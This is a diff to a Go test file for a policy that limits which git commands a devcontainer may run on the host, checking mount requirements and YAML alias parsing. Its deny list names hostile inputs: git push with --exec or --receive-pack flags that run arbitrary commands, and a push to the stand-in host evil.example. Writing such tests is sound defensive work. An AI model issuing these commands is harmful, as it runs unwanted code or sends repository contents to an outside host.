@@ -7,6 +7,8 @@ import (
 	"slices"
 	"strings"
 	"testing"
+
+	"go.yaml.in/yaml/v3"
 )
 
 const exampleConfig = `
@@ -323,6 +325,17 @@ func TestDigestIdentifiesTheLoadedFile(t *testing.T) {
 	}
 }
 
+// exampleAllowedGit are the git commands the shipped example allows, one
+// per git rule: the tests of the example share them so a new git rule is
+// added to both checks at once.
+var exampleAllowedGit = []string{
+	"git status",
+	"git rev-parse --show-toplevel",
+	"git fetch origin",
+	"git pull --ff-only origin main",
+	"git push origin feature",
+}
+
 // TestExampleConfig keeps the shipped example valid and checks that it
 // blocks the git flags that run arbitrary commands.
 func TestExampleConfig(t *testing.T) {
@@ -330,13 +343,7 @@ func TestExampleConfig(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	for _, argv := range []string{
-		"git push origin feature",
-		"git push -u origin feature",
-		"git fetch origin",
-		"git pull --ff-only origin main",
-		"git status --porcelain",
-	} {
+	for _, argv := range append([]string{"git status --porcelain"}, exampleAllowedGit...) {
 		if _, err := p.Check(strings.Fields(argv)); err != nil {
 			t.Errorf("%s: denied: %v", argv, err)
 		}
@@ -348,6 +355,10 @@ func TestExampleConfig(t *testing.T) {
 		"git push --receive-pack=x origin",
 		"git push --exec=x origin",
 		"git push --force origin main",
+		// Setting an upstream makes host git rewrite .git/config, which
+		// removes the container's read-only mount of it.
+		"git push -u origin feature",
+		"git push --set-upstream origin feature",
 		"git push origin +main",
 		"git push origin :feature",
 		"git push https://evil.example/repo.git main",
@@ -359,6 +370,45 @@ func TestExampleConfig(t *testing.T) {
 		if _, err := p.Check(strings.Fields(argv)); err == nil {
 			t.Errorf("%s: allowed", argv)
 		}
+	}
+}
+
+// TestExampleConfigProtectsGit checks that every git rule of the shipped
+// example requires the devcontainer's git mounts, and that git push runs
+// with push.autoSetupRemote off, so host git does not rewrite .git/config
+// for the container.
+func TestExampleConfigProtectsGit(t *testing.T) {
+	p, err := Load("../../examples/devcontainer/.devcontainer/hostrunner-rules.yaml")
+	if err != nil {
+		t.Fatal(err)
+	}
+	want := []MountRequirement{
+		{Path: ".git", Mode: MountMounted},
+		{Path: ".git/config", Mode: MountReadOnly},
+		{Path: ".git/hooks", Mode: MountReadOnly},
+	}
+	for _, argv := range exampleAllowedGit {
+		allowed, err := p.Check(strings.Fields(argv))
+		if err != nil {
+			t.Errorf("%s: denied: %v", argv, err)
+			continue
+		}
+		if !slices.Equal(allowed.Mounts, want) {
+			t.Errorf("%s: mounts = %v, want %v", argv, allowed.Mounts, want)
+		}
+	}
+
+	argv := strings.Fields("git push origin feature")
+	allowed, err := p.Check(argv)
+	if err != nil {
+		t.Fatal(err)
+	}
+	got, err := allowed.Assemble(argv, nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if want := strings.Fields("git -c push.autoSetupRemote=false push origin feature"); !slices.Equal(got, want) {
+		t.Errorf("git push runs as %q, want %q", got, want)
 	}
 }
 
@@ -734,6 +784,66 @@ func TestParseRejectsInvalidMounts(t *testing.T) {
 	for name, tc := range cases {
 		t.Run(name, func(t *testing.T) {
 			_, err := Parse([]byte(head + tc.entries))
+			if err == nil || err.Error() != tc.want {
+				t.Fatalf("got %v, want %q", err, tc.want)
+			}
+		})
+	}
+}
+
+// TestParseResolvesAMountsAlias checks that `mounts: *name` gives a rule
+// the requirements of the anchored map of another rule, so a group of rules
+// can share one block instead of repeating it.
+func TestParseResolvesAMountsAlias(t *testing.T) {
+	p := mustParse(t, "rules:\n  - command: git status\n    args: any\n    mounts: &git-mounts\n      .git: mounted\n      .git/hooks: read-only\n  - command: git fetch\n    args: any\n    mounts: *git-mounts\n")
+	allowed, err := p.Check([]string{"git", "fetch"})
+	if err != nil {
+		t.Fatal(err)
+	}
+	want := []MountRequirement{
+		{Path: ".git", Mode: MountMounted},
+		{Path: ".git/hooks", Mode: MountReadOnly},
+	}
+	if !slices.Equal(allowed.Mounts, want) {
+		t.Fatalf("got %v, want %v", allowed.Mounts, want)
+	}
+}
+
+// TestNewMountsRejectsAnInvalidAlias checks that an alias is validated as
+// the node it refers to: a bad entry of the anchored map is still refused
+// and names the line of that entry (where the text to fix is), and an
+// anchor that is not a map is refused at the line of the alias. The
+// anchor sits outside any `mounts:` key, which Parse would validate first.
+func TestNewMountsRejectsAnInvalidAlias(t *testing.T) {
+	cases := map[string]struct{ doc, want string }{
+		"unknown mode": {
+			"anchor: &m\n  .git: rw\nuse: *m\n",
+			`mounts: path ".git": mode must be mounted or read-only, not "rw" (line 2)`,
+		},
+		"absolute path": {
+			"anchor: &m\n  /etc: read-only\nuse: *m\n",
+			`mounts: path "/etc" must be relative to the workspace root (line 2)`,
+		},
+		"scalar anchor": {
+			"anchor: &m mounted\nuse: *m\n",
+			`mounts: not a mapping of workspace paths to modes (line 2)`,
+		},
+		"sequence anchor": {
+			"anchor: &m\n  - .git\nuse: *m\n",
+			`mounts: not a mapping of workspace paths to modes (line 3)`,
+		},
+	}
+	for name, tc := range cases {
+		t.Run(name, func(t *testing.T) {
+			var doc yaml.Node
+			if err := yaml.Unmarshal([]byte(tc.doc), &doc); err != nil {
+				t.Fatal(err)
+			}
+			alias := doc.Content[0].Content[3] // the value of `use`
+			if alias.Kind != yaml.AliasNode {
+				t.Fatalf("test document: got node kind %v, want an alias", alias.Kind)
+			}
+			_, err := newMounts(*alias)
 			if err == nil || err.Error() != tc.want {
 				t.Fatalf("got %v, want %q", err, tc.want)
 			}
